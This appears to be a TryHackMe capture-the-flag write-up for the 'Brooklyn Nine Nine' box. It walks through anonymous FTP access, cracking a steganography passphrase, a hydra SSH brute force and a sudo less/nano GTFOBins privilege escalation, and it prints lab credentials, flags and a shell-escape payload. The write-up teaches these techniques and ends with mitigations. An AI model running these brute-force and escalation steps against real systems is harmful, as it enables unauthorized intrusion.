# Brooklyn Nine Nine: TryHackMe Writeup

```
 ___ ___ _____   _____ ____  ____ _   _
| _ ) _ \___ /  | __ )___ \/ ___| \ | |
| _ \   / |_ \  |  _ \ __) \___ \  \| |
|___/_|_\___/  | |___/____/____/_| \_|
        "Title of Detective"
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-26 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~14 min read

---

## 📋 Table of Contents

- [Prerequisites](#prerequisites)
- [Progress Checklist](#progress-checklist)
- [🛠️ Tools Used](#️-tools-used)
- [⚡ TL;DR](#-tldr)
- [📖 Introduction](#-introduction)
- [🔍 Recon](#-recon)
- [🚪 Foothold](#-foothold)
- [🐚 Shell / Access](#-shell--access)
- [📈 Escalation](#-escalation)
- [🐇 Rabbit Holes](#-rabbit-holes)
- [🏁 Flag](#-flag)
- [🛡️ Mitigations](#️-mitigations)
- [💡 Key Takeaway](#-key-takeaway)
- [🔁 If I Did It Again](#-if-i-did-it-again)
- [🔚 Changelog](#-changelog)

---

## Prerequisites

Assumed knowledge for this one:

- Basic FTP enumeration (including anonymous login abuse)
- Reading HTML source for hidden comments/hints
- Steganography basics: `exiftool`, `binwalk`, `steghide`/`stegseek` concepts
- Comfort with `hydra` for SSH brute-forcing
- Basic Linux privilege escalation via `sudo -l` and GTFOBins

---

## Progress Checklist

- [x] Recon (nmap, FTP enumeration, feroxbuster)
- [x] Anonymous FTP note retrieval
- [x] Steganography hint discovery (HTML comment)
- [x] Image steg cracking (stegseek + rockyou)
- [x] Credential discovery (holt's password, hidden in the extracted note)
- [ ] SSH login as `holts` (wrong username, failed)
- [x] SSH brute force success on `jake`
- [x] Lateral movement `jake` → `holt` (correct username, same password)
- [x] User flag captured
- [x] Privilege escalation via `sudo` GTFOBin (`less`)
- [x] Root flag captured

---

## 🛠️ Tools Used

- 🔎 Nmap: port scanning and service enumeration
- 📁 FTP (anonymous login): pulling an exposed note file
- 🕷️ Feroxbuster: directory and subdomain brute force (mostly dead ends)
- 🖼️ ExifTool / Binwalk: image metadata and embedded file inspection
- 🕵️ Stegseek: automated steganography passphrase cracking
- 🐎 Hydra: SSH credential brute forcing
- 🔓 GTFOBins (`nano`, `less` via sudo): privilege escalation

---

## ⚡ TL;DR

An anonymous FTP login hands over a note hinting that Jake's password is weak, and the site's HTML source drops a not-so-subtle "have you heard of steganography?" comment pointing at the homepage background image. Cracking that image with `stegseek` and `rockyou.txt` reveals Holt's password buried inside, but a username mix-up (`holts` instead of `holt`) burns the first login attempt. Brute-forcing Jake's SSH login instead gets a foothold, confirms the leaked password was right all along, and a `sudo -l` check on Holt's account turns up a NOPASSWD `nano` entry that doesn't pan out: the actual root read comes through Jake's own `sudo less` GTFOBin entry.

---

## 📖 Introduction

*Today's victim is run by Brooklyn's finest*, or at least, a box themed after them. Somewhere between an anonymous FTP share, a suspiciously generic stock background image, and two squad members who really should have used a password manager, there's a root flag waiting. Captain Holt would not be pleased with how this one goes down.

---

## 🔍 Recon

*Standard nmap service scan against the target:*

```bash
nmap -sV -sC 10.49.142.139
```

```text
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
```

Cleaned up as a table:

| Port | Service | Version |
| --- | --- | --- |
| 21 | FTP | vsftpd 3.0.3 (anonymous login allowed) |
| 22 | SSH | OpenSSH 7.6p1 (Ubuntu) |
| 80 | HTTP | Apache 2.4.29 (Ubuntu) |

*The `ftp-anon` line in the nmap output is doing a lot of the work here*: anonymous FTP access is practically an open invitation, and there's already a named file (`note_to_jake.txt`) sitting in the root of the share.

### Anonymous FTP grab

```bash
ftp 10.49.142.139
# Name: anonymous
# Password: (blank)
```

```text
230 Login successful.
ftp> get note_to_jake.txt
226 Transfer complete.
```

```bash
cat note_to_jake.txt
```

```text
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

*Subtle as a brick*, but useful. This confirms Jake is a valid username and that his password is expected to be weak, which is basically a green light for a wordlist-based brute force later.

### Poking at the website

*Viewing the page source of the homepage:*

```bash
curl -s http://10.49.142.139/ | grep -A2 -B2 "!--"
```

```html
<div class="bg"></div>
<p>This example creates a full page background image...</p>
<!-- Have you ever heard of steganography? -->
```

A hidden HTML comment directly asking about steganography. *Not exactly a riddle, but it tells us exactly where to look next*: the background image referenced earlier in the page's CSS.

Feroxbuster was run twice: once against a common wordlist, once against a much larger subdomain list: *and came back essentially empty both times* aside from the index page itself. No hidden directories to chase here; the real path forward was always going to be that image.

---

## 🚪 Foothold

### Pulling and inspecting the image

```bash
wget http://10.49.142.139/brooklyn99.jpg
exiftool brooklyn99.jpg
```

ExifTool came back clean: *standard JPEG metadata, nothing embedded in the EXIF fields themselves.* `binwalk` was equally uneventful, reporting just a plain JPEG structure with no obviously appended files. *This pointed toward a passphrase-protected steganography tool like steghide rather than a raw file concatenation trick.*

A direct `steghide extract` attempt without a passphrase failed outright:

```bash
steghide extract -sf brooklyn99.jpg
```

```text
steghide: can not uncompress data. compressed data is corrupted.
```

*An empty passphrase wasn't going to cut it: time to brute force the passphrase itself instead of the extraction.*

### Cracking the steg passphrase

`stegseek` automates exactly this: it takes a wordlist and tries each entry as a steghide passphrase until one successfully extracts embedded data.

*Running stegseek against the image using rockyou as the candidate passphrase list:*

```bash
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

```text
[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".
# ^^^ this is the important bit
```

- the passphrase itself turned out to be the painfully generic `admin`
- *this took an embarrassingly short amount of time* given the simplicity of the password, but the bigger time sink had been the dead-end metadata checks before reaching for stegseek at all

*Reading the extracted file:*

```bash
cat brooklyn99.jpg.out
```

```text
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

*(~8 mins into the box)*: a clean credential, handed over in plaintext. The only catch: it's labeled for "Holt," not for the actual system username.

---

## 🐚 Shell / Access

### The username trap

The note says "Holts Password": *a reasonably natural reading of that is the username being `holts`,* so that's what got tried first:

```bash
ssh holts@10.49.142.139
```

```text
holts@10.49.142.139: Permission denied (publickey,password).
```

*Three strikes and out.* Rather than burn more attempts guessing username variations, the smarter move was pivoting to the other known username: Jake, and brute-forcing his login instead, using the explicit "weak password" hint from the FTP note as justification for going straight to rockyou.

### Brute forcing Jake

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.49.142.139
```

```text
[22][ssh] host: 10.49.142.139   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```

| Username | Password | Where found |
| --- | --- | --- |
| jake | `987654321` | Hydra brute force against rockyou.txt |
| holt | `fluffydog12@ninenine` | Steghide-extracted note.txt inside brooklyn99.jpg |

```bash
ssh jake@10.49.142.139
```

```text
jake@brookly_nine_nine:~$ ls /home
amy  holt  jake
```

*And there it is*: the actual home directory is `holt`, not `holts`. The earlier failed login wasn't a wrong password, it was a wrong username the whole time.

```bash
su holt
# Password: fluffydog12@ninenine
```

```text
holt@brookly_nine_nine:/home/jake$
```

Confirmed: the steg-extracted password was correct all along; it just needed the right account name attached to it.

```bash
holt@brookly_nine_nine:~$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

User flag captured. *(~16 mins into the box)*

---

## 📈 Escalation

### Checking sudo rights

*Standard privilege check as holt:*

```bash
sudo -l
```

```text
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

`nano` running as root with no password is a textbook GTFOBins entry: *nano can normally be used to spawn a root shell via its built-in command-execution feature.* This attempt didn't pan out within the session (see Rabbit Holes), so the check was repeated on Jake's account instead:

```bash
su jake
sudo -l
```

```text
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

`less` is an even more reliable GTFOBin: *when sudo grants passwordless `less`, you can simply open any file and use less's internal shell escape to drop into a root shell, or in this case just page through restricted files directly as root.*

### Reading root.txt

```bash
sudo /usr/bin/less /root/root.txt
```

```text
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

Root flag captured. *(~22 mins into the box)*

---

## 🐇 Rabbit Holes

**EXIF and binwalk on the image:** Both came back clean, *which in hindsight was the actual signal to move straight to a passphrase-protected steg tool rather than a spending more time digging through metadata.* The HTML comment had already pointed at "steganography" specifically, so a passphrase-based approach (steghide/stegseek) should have been the first move rather than the third.

**`holts` vs `holt`:** The note's phrasing ("Holts Password") reads naturally as a username, but it was actually just a possessive ("Holt's password") describing whose credential it was. *A quick `ls /home` after landing on the box would have settled this immediately instead of guessing.* This burned the SSH attempt limit on a perfectly valid password attached to the wrong account name.

**`/bin/nano` as holt:** The NOPASSWD sudo entry for nano looked like the obvious privesc path, and the command was run directly against `/root/root.txt`. *No output or shell escape was captured from this attempt in the session*: nano's GTFOBins technique typically requires using its in-editor command execution (`^R^X`, then `reset; sh 1>&0 2>&0`) rather than just opening a file directly, which likely explains why this didn't produce a usable result on its own. The working path ended up being Jake's separate `less` entitlement instead.

---

## 🏁 Flag

| Flag | Value |
| --- | --- |
| User flag (holt) | `ee11cbb19052e40b07aac0ca060c23ee` |
| Root flag | `63a9f0ea7bb98050796b649e85481845` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Anonymous FTP access enabled | Medium | Disable anonymous FTP login entirely unless explicitly required, and never store sensitive notes on a publicly readable share |
| Credentials embedded in steganographic image | Medium | Never distribute credentials via hidden files, even "obscured" ones: security through obscurity is not access control |
| Weak, wordlist-crackable passwords | High | Enforce strong password policies and rate-limit/lock out SSH after repeated failed attempts |
| Passwordless `sudo` on `nano` | Critical | Avoid NOPASSWD sudo grants for any editor or pager binary; if required, use a restricted wrapper instead of the raw binary |
| Passwordless `sudo` on `less` | Critical | Same as above: pagers with shell-escape capability are equivalent to a full root shell when granted via sudo |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** A correct password attached to a guessed username is indistinguishable from a wrong password until you actually check `/etc/passwd` or `/home`: verify the account name before burning login attempts.

---

## 🔁 If I Did It Again

I'd jump straight to `stegseek` with rockyou the moment the HTML comment mentioned steganography, instead of spending time on EXIF and binwalk checks first.

---

## 🔚 Changelog

*Last updated: 2026-06-26*

---

[↑ Back to top](#brooklyn-nine-nine--tryhackme-writeup)
